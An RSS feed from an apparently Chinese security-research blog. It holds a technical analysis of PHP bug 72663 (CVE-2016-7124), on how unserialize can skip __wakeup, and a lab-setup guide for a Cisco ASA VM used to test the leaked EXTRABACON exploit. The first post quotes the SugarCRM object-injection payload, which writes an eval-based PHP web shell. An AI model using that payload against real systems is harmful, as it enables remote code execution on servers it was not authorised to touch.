<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    
    <title><![CDATA[Hc1m1]]></title>
    <link>http://0x48.pw//</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    <description><![CDATA[水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会]]></description>
    <pubDate>Tue, 13 Sep 2016 10:25:30 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title><![CDATA[php bugs 72663分析(CVE-2016-7124)]]></title>
      <link>http://0x48.pw/2016/09/13/0x22/</link>
      <guid>http://0x48.pw/2016/09/13/0x22/</guid>
      <pubDate>Tue, 13 Sep 2016 03:11:11 GMT</pubDate>
      <description>
      <![CDATA[<p>前几天出了一个<code>SugarCRM 6.5.23 - REST PHP Object Injection Exploit</code>漏洞, 昨天360发了一篇分析文章, 什么狗屁, 看完了对php bugs 72663这个bug还是一堆疑问<br>本文主要分析php bugs 72663这个bug<br>SugarCRM的漏洞分析见p0wd3r的文章: <a href="http://paper.seebug.org/39/">http://paper.seebug.org/39/</a></p>]]>
      
      </description>
      <content:encoded><![CDATA[<p>前几天出了一个<code>SugarCRM 6.5.23 - REST PHP Object Injection Exploit</code>漏洞, 昨天360发了一篇分析文章, 什么狗屁, 看完了对php bugs 72663这个bug还是一堆疑问<br>本文主要分析php bugs 72663这个bug<br>SugarCRM的漏洞分析见p0wd3r的文章: <a href="http://paper.seebug.org/39/" target="_blank" rel="external">http://paper.seebug.org/39/</a></p>
<a id="more"></a>
<p>php bugs 72663: <a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="external">https://bugs.php.net/bug.php?id=72663</a><br>360 上分析的文章: <a href="http://bobao.360.cn/learning/detail/3020.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3020.html</a><br>PS:<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ php --<span class="built_in">version</span></span><br><span class="line">PHP <span class="number">7.0</span>.<span class="number">0</span> <span class="params">(cli)</span> <span class="params">(built: May <span class="number">15</span> <span class="number">2016</span> <span class="number">02</span>:<span class="number">41</span>:<span class="number">06</span>)</span> <span class="params">( NTS )</span></span><br><span class="line">Copyright <span class="params">(c)</span> <span class="number">1997</span>-<span class="number">2015</span> The PHP Group</span><br><span class="line">Zend Engine v3.<span class="number">0.0</span>, Copyright <span class="params">(c)</span> <span class="number">1998</span>-<span class="number">2015</span> Zend Technologies</span><br></pre></td></tr></table></figure></p>
<p>下面这个是360这篇文章中给出的对<code>72663 bug</code>的测试代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$wanniba</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;wanniba = <span class="string">"*__destruct&lt;br /&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$this</span>-&gt;wanniba;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"__destruct OK!&lt;br /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="variable">$this</span>-&gt;wanniba = <span class="string">"*__wakeup&lt;br /&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$this</span>-&gt;wanniba;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__wakeup OK!&lt;br /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#$a = new test();</span></span><br><span class="line"><span class="comment">#echo serialize($a);</span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$payload</span> = <span class="string">'O:4:"test":1:&#123;s:7:"wanniba";N;&#125;'</span>;</span><br><span class="line"><span class="variable">$payload1</span> = <span class="string">'O:4:"test":1:&#123;s:10:"\0*\0wanniba";N;&#125;'</span>;</span><br><span class="line"><span class="variable">$abc</span> = unserialize(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$abc1</span> = unserialize(<span class="variable">$payload1</span>);</span></span><br></pre></td></tr></table></figure></p>
<h3 id="问题1">问题1</h3><p><code>\0*\0</code> 有何意义?<br>在php bugs原文里还有这里都出现了这个字符串, 那么这个字符串有何意义?<br>在上面的代码中<code>\0*\0</code>是处在单引号中, 在php里, 单引号中的为纯字符串, 所以这是5个字符<code>\</code>, <code>0</code>, <code>*</code>, <code>\</code>, <code>0</code>, 而不是<code>chr(0)+&#39;*&#39;+chr(0)</code><br>所以在上面的demo中<code>\0*\0wanniba</code>为12个字符, 而序列化前面的确是10, 这当然会反序列化失败, 而出现该结果<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">*__wakeup</span></span><br><span class="line">__wakeup OK!</span><br><span class="line"><span class="comment">*__destruct</span></span><br><span class="line">__destruct OK!</span><br><span class="line"></span><br><span class="line">Notice: unserialize(): <span class="keyword">Error</span> at offset 30 of 37 bytes <span class="keyword">in</span> /home/wwwroot/default/<span class="keyword">test</span>/test3.php <span class="keyword">on</span> <span class="keyword">line</span> 48</span><br><span class="line"><span class="comment">*__destruct</span></span><br><span class="line">__destruct OK!</span><br></pre></td></tr></table></figure></p>
<p>按这篇文章来说, 如果这是正确结果的话, 那么我根本不需要<code>\0*\0</code>字符串, 只要<code>$payload1 = &#39;O:4:&quot;test&quot;:1:{s:10:&quot;wanniba&quot;;N;}&#39;;</code>， 就可以出现同样的结果</p>
<p>所以又回到开头的问题上来了, <code>\0*\0</code>有何意义?</p>
<p>在看看php bugs上的PoC: <code>$sess = &#39;O:9:&quot;Exception&quot;:2:{s:7:&quot;&#39;.&quot;\0&quot;.&#39;*&#39;.&quot;\0&quot;.&#39;file&quot;;R:1;}&#39;;</code></p>
<p>从这可以很明显的看出, <code>\0*\0</code>是有意义的三个字符, 而不是上面代码中无意义的5个字符</p>
<h3 id="问题2">问题2</h3><p>危害?<br>在上面问题没想清除的前提下, 我们假设上面代码的输出结果就是漏洞应该输出的结果, 那么危害是啥?<br>这稍微要设计到SugarCRM的这个漏洞, 从它的漏洞分析中我们可以猜测, 该漏洞的作用是在反序列化的过程中, 跳过<code>__wakeup</code>魔术方法, 然后直接执行<code>__destruct</code>, 然后<code>__destruct</code>魔术方法中有我们可控的部分</p>
<p>然后我写了下面的demo:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$name</span>)</span> </span>&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		var_dump(<span class="variable">$this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;name = <span class="keyword">NULL</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"wakeup&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#$s = new Test("test1");</span></span><br><span class="line"><span class="comment">#$g = serialize($s);</span></span><br><span class="line"><span class="comment">#echo $g;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="string">'O:4:"Test":1:&#123;s:4:"name";s:5:"test1";&#125;'</span>;</span><br><span class="line"><span class="variable">$f2</span> = <span class="string">'O:4:"Test":1:&#123;s:5:"name";s:5:"test1";&#125;'</span>;</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$f2</span>);</span></span><br></pre></td></tr></table></figure></p>
<p>输出:<br><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wakeup</span><br><span class="line"><span class="keyword">object</span>(<span class="type">Test</span>)#<span class="number">2</span> (<span class="number">1</span>) &#123; [<span class="string">"name"</span>]=&gt; <span class="type">NULL</span> &#125;</span><br><span class="line"><span class="type">Notice</span>: unserialize<span class="literal">()</span>: <span class="type">Error</span> at offset <span class="number">24</span> <span class="keyword">of</span> <span class="number">38</span> <span class="built_in">bytes</span> <span class="keyword">in</span> /home/wwwroot/default/test/test3.php on line <span class="number">25</span></span><br><span class="line"><span class="keyword">object</span>(<span class="type">Test</span>)#<span class="number">1</span> (<span class="number">1</span>) &#123; [<span class="string">"name"</span>]=&gt; <span class="type">NULL</span> &#125;</span><br></pre></td></tr></table></figure></p>
<p>然后我们并没有办法控制<code>name</code>变量, 所以说这洞有啥用?</p>
<hr>
<p>看了p0wd3r的demo后, 终于懂了<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$age</span>;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$sex</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>)</span> </span>&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">		<span class="variable">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">		<span class="variable">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment"># var_dump($this);</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;name = <span class="keyword">NULL</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"wakeup&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Test(<span class="string">"Rem"</span>, <span class="number">14</span>, <span class="string">'girl'</span>);</span><br><span class="line"><span class="variable">$g</span> = serialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$g</span>;</span></span><br></pre></td></tr></table></figure></p>
<p>在网页上看输出是:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">O</span>:<span class="value"><span class="number">4</span>:<span class="string">"Test"</span>:<span class="number">3</span>:&#123;s:<span class="number">10</span>:<span class="string">"Testname"</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">3</span>:<span class="string">"Rem"</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">6</span>:<span class="string">"*age"</span></span></span>;<span class="rule"><span class="attribute">i</span>:<span class="value"><span class="number">14</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">3</span>:<span class="string">"sex"</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">4</span>:<span class="string">"girl"</span></span></span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现奇怪的地方了, 然后<br><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = requests.get("http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/test/test3.php")</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r.content</span><br><span class="line">'\nO:<span class="number">4</span>:"Test":<span class="number">3</span>:&#123;s:<span class="number">10</span>:"\x00Test\x00name";s:<span class="number">3</span>:"<span class="comment">Rem";s:6:"\x00*\x00age";i:14;s:3:"sex";s:4:"girl";&#125;\n\n'</span></span><br></pre></td></tr></table></figure></p>
<p>研究发现, <code>\x00 + 类名 + \x00 + 变量名</code> 反序列化出来的是<code>private</code>变量, <code>\x00 + * + \x00 + 变量名</code> 反序列化出来的是<code>protected</code>变量, 而直接变量名反序列化出来的是<code>public</code>变量, 好了, 现在第一个问题解决了</p>
<p>下面是第二个问题,<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$age</span>;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$sex</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>)</span> </span>&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">		<span class="variable">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">		<span class="variable">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		var_dump(<span class="variable">$this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;name = <span class="keyword">NULL</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"wakeup&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#$s = new Test("Rem", 14, 'girl');</span></span><br><span class="line"><span class="comment">#$g = serialize($s);</span></span><br><span class="line"><span class="comment">#echo $g;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="string">'O:4:"Test":3:&#123;s:10:"'</span>.<span class="string">"\0Test\0"</span>.<span class="string">'name";s:3:"Rem";s:6:"'</span>.<span class="string">"\0*\0"</span>.<span class="string">'age";i:14;s:3:"sex";s:4:"girl";&#125;'</span>;</span><br><span class="line"><span class="variable">$f2</span> = <span class="string">'O:4:"Test":4:&#123;s:10:"'</span>.<span class="string">"\0Test\0"</span>.<span class="string">'name";s:3:"Rem";s:6:"'</span>.<span class="string">"\0*\0"</span>.<span class="string">'age";i:14;s:3:"sex";s:4:"girl";&#125;'</span>;</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$c2</span> = unserialize(<span class="variable">$f2</span>);</span></span><br></pre></td></tr></table></figure></p>
<p>输出结果<br><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wakeup</span><br><span class="line"></span><br><span class="line"><span class="type">Notice</span>: unserialize<span class="literal">()</span>: <span class="type">Unexpected</span> <span class="keyword">end</span> <span class="keyword">of</span> serialized data <span class="keyword">in</span> /home/wwwroot/default/test/test3.php on line <span class="number">29</span></span><br><span class="line"><span class="keyword">object</span>(<span class="type">Test</span>)#<span class="number">2</span> (<span class="number">3</span>) &#123; [<span class="string">"name"</span>:<span class="string">"Test"</span>:<span class="keyword">private</span>]=&gt; <span class="built_in">string</span>(<span class="number">3</span>) <span class="string">"Rem"</span> [<span class="string">"age"</span>:protected]=&gt; <span class="built_in">int</span>(<span class="number">14</span>) [<span class="string">"sex"</span>]=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">"girl"</span> &#125;</span><br><span class="line"><span class="type">Notice</span>: unserialize<span class="literal">()</span>: <span class="type">Error</span> at offset <span class="number">81</span> <span class="keyword">of</span> <span class="number">83</span> <span class="built_in">bytes</span> <span class="keyword">in</span> /home/wwwroot/default/test/test3.php on line <span class="number">29</span></span><br><span class="line"><span class="keyword">object</span>(<span class="type">Test</span>)#<span class="number">1</span> (<span class="number">3</span>) &#123; [<span class="string">"name"</span>:<span class="string">"Test"</span>:<span class="keyword">private</span>]=&gt; <span class="type">NULL</span> [<span class="string">"age"</span>:protected]=&gt; <span class="built_in">int</span>(<span class="number">14</span>) [<span class="string">"sex"</span>]=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">"girl"</span> &#125;</span><br></pre></td></tr></table></figure></p>
<p>反序列化<code>$f</code> -&gt; 执行<code>__wakeup</code> -&gt; 反序列化<code>$f2</code> -&gt; 对象属性个数错误 -&gt; 销毁, 执行<code>__destruct</code> -&gt; 程序结束销毁<code>$c</code>, 执行<code>__destruct</code></p>
<p>所以有了上面的输出结果</p>
<h3 id="总结">总结</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$f2 = 'O:<span class="number">4</span>:"Test":<span class="number">4</span>:&#123;s:<span class="number">10</span>:"'."\<span class="number">0</span>Test\<span class="number">0</span>".'name";s:<span class="number">3</span>:"<span class="comment">Rem";s:6:"'."\0*\0".'age";i:14;s:3:"sex";s:4:"girl";&#125;';</span></span><br></pre></td></tr></table></figure>
<p>针对上面这串序列化字符串猜测反序列化是从左往右执行, 首先匹配到O, 得知是一个对象 -&gt; 匹配到4, 得知对象名为4个字符串 -&gt; 匹配对象名<code>Test</code>, 搜索自己的内存空间检测是否定义过该对象, 得知定义过, 分配sizeof(Test)大小的内存空间 -&gt; 匹配到4, 得知有给4个对象属性赋值 -&gt; 第一个匹配到s, 得知是字符串变量 -&gt; 匹配到10, 得知变量名长度为10 -&gt; 匹配变量名, 发现开头是”\0”+对象名+”\0”, 得知是private变量, 其后为变量名 -&gt; (重点结束开始快进)匹配s:3:”Rem”, 变量的值为长度为3的字符串Rem -&gt; ……..匹配结束第三个属性, 匹配第四个, 匹配到}, 出错, 退出序列化, 销毁对象, 执行<strong>destruct方法(就是这里跳过了</strong>wakeup方法直接执行__destruct方法)</p>
<p>然后稍微看看SugarCRM的PoC<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    '<span class="keyword">method</span>': 'login',</span><br><span class="line">    'input_type': '<span class="type">Serialize</span>',</span><br><span class="line">    'rest_data': 'O:+<span class="number">14</span>:<span class="string">"SugarCacheFile"</span>:<span class="number">23</span>:&#123;S:<span class="number">17</span>:<span class="string">"\\00*\\00_cacheFileName"</span>;s:<span class="number">15</span>:<span class="string">"../custom/1.php"</span>;S:<span class="number">16</span>:<span class="string">"\\00*\\00_cacheChanged"</span>;b:<span class="number">1</span>;S:<span class="number">14</span>:<span class="string">"\\00*\\00_localStore"</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">29</span>:<span class="string">"&lt;?php eval($_POST[\'HHH\']); ?&gt;"</span>;&#125;&#125;',</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里出现了一个问题, 纠结了我很久, 这里的payload用的是<code>&#39;\00*\00&#39;</code> 而不是 <code>&quot;\00*\00&quot;</code>, 而之间测试代码告诉我们的不一样啊, 为啥<code>&#39;\00*\00&#39;</code>也行呢?</p>
<p>PS: 这里注意区别<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="prompt">&gt;&gt;</span>&gt; a = <span class="string">"\\00*\\00"</span>	       <span class="comment"># 这个是php的'\00*\00'</span></span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;</span>&gt; b = <span class="string">"\00*\00"</span>		   <span class="comment"># 这个是php的"\00*\00"</span></span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;</span>&gt; a.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'5c30302a5c3030'</span></span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;</span>&gt; b.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'002a00'</span></span><br></pre></td></tr></table></figure></p>
<p>最后找到一些非官方的资料(找不到官方的): <a href="http://www.neatstudio.com/show-161-1.shtml" target="_blank" rel="external">http://www.neatstudio.com/show-161-1.shtml</a></p>
<ul>
<li>a - array</li>
<li>b - boolean</li>
<li>d - double</li>
<li>i - integer</li>
<li>o - common object</li>
<li>r - reference</li>
<li>s - non-escaped binary string</li>
<li>S - escaped binary string</li>
<li>C - custom object</li>
<li>O - class</li>
<li>N - null</li>
<li>R - pointer reference</li>
<li>U - unicode string</li>
</ul>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">s:</span><span class="number">5</span>:<span class="string">"\00te"</span>    表示的是<span class="number">5</span>个字符\ <span class="number">0</span> <span class="number">0</span> t e</span><br><span class="line"><span class="label">S:</span><span class="number">3</span>:<span class="string">"\00te"</span>	   表示的是<span class="number">3</span>个字符\<span class="number">0</span> t e</span><br></pre></td></tr></table></figure>
<p>测试代码中我用的是<code>s</code>, 而payload中用的是<code>S</code>, 所以说本质还是一样的, 也就是我上面所说, 是<code>&quot;\0*\0&quot;</code></p>
<p>该bug影响的php版本和SugarCRM漏洞详情请看p0wd3r分析文章</p>
]]></content:encoded>
      <comments>http://0x48.pw/2016/09/13/0x22/#disqus_comments</comments>
    </item>
    
    <item>
      <title><![CDATA[Cisco ASA RCE 环境搭建]]></title>
      <link>http://0x48.pw/2016/08/31/0x21/</link>
      <guid>http://0x48.pw/2016/08/31/0x21/</guid>
      <pubDate>Wed, 31 Aug 2016 14:56:11 GMT</pubDate>
      <description>
      <![CDATA[<p>这几天在研究方程式泄露的EXTRABACON（EXBA）PoC, 网上没找到能成功的远程, 所以准备自己本地搭环境, 然后看到了这篇文章<a href="http://www.freebuf.com/vuls/112589.html">http://www.freebuf.com/vuls/112589.html</a> </p>]]>
      
      </description>
      <content:encoded><![CDATA[<p>这几天在研究方程式泄露的EXTRABACON（EXBA）PoC, 网上没找到能成功的远程, 所以准备自己本地搭环境, 然后看到了这篇文章<a href="http://www.freebuf.com/vuls/112589.html" target="_blank" rel="external">http://www.freebuf.com/vuls/112589.html</a> </p>
<a id="more"></a>
<p>这篇文章是在方程式信息泄露后看过的对我最有帮助的文章了, 不过尴尬的是, 文章中复现环境是Windows下使用VM， 可是我的环境却是Linux+VBox</p>
<p>表示我的Windows都是用来打游戏的, 啥工具都没有, 仔细看了下文章, 准备去搜搜Linux+VBox的解决方案</p>
<p>首先是虚拟机镜像文件这些东西: <a href="http://l.0x48.pw/blackhat/ASA-8.4.zip" target="_blank" rel="external">http://l.0x48.pw/blackhat/ASA-8.4.zip</a></p>
<p>解压出来， 里面有个<code>ASA-8.4.ovf</code>, 可直接用VBox的import applicace导入虚拟机</p>
<p>讲道理, 应该导入后就可以使用了, 但是没人跟你讲道理, 所以接下来要做两件事, 或者可以说是一件事 —— 配网络, 配网络就需要使用Serial口连进去.</p>
<h2 id="连接Serial口">连接Serial口</h2><p>如下图所示:<br><img src="http://qn.lazysheep.cc/img/cisco1.png" alt="cisco1"></p>
<p>基本默认就好, 重要的是<code>Path/Address: /tmp/gns3_vbox/5d5928d1-3cb9-46c6-85cb-b7e1121f188c</code></p>
<p>这个地址自己填一个, 要写到VBox可写目录, 所以选择了/tmp</p>
<p>然后在Ubuntu下连接Serial口的工具我选择了<code>minicom</code>:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo apt install minicom</span><br><span class="line"><span class="variable">$ </span>sudo vim /etc/minicom/minirc.dfl</span><br><span class="line">pu port			unix<span class="comment">#/tmp/gns3_vbox/5d5928d1-3cb9-46c6-85cb-b7e1121f188c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#后面跟的路径就是上面VBox的那个路径</span></span><br></pre></td></tr></table></figure></p>
<p>然后就是启动虚拟机了, 不过在启动之前还有几个问题</p>
<p>如图:<br><img src="http://qn.lazysheep.cc/img/cisco2.png" alt="cisco2"></p>
<p>更大的那块硬盘要作为Master, 要设置成启动盘, 虚拟机导入后是500kb的那块是启动盘, 所以启动不起来</p>
<p>然后是网络, 自己测试就开一块网卡就够了, 然后我使用only-host, 如图:<br><img src="http://qn.lazysheep.cc/img/cisco3.png" alt="cisco3"></p>
<p><img src="http://qn.lazysheep.cc/img/cisco4.png" alt="cisco4"></p>
<p>然后可以开机了</p>
<p>开机后选择<code>ASA 8.42</code> 启动, 然后会停在<code>Booting the kernel</code>, 然后别等了, 你等再久也是这页面(我最开始摸索的时候傻傻的等了半小时), 现在就可以使用<code>minicom</code>去连接ASA的Serial口了</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo minicom</span><br></pre></td></tr></table></figure>
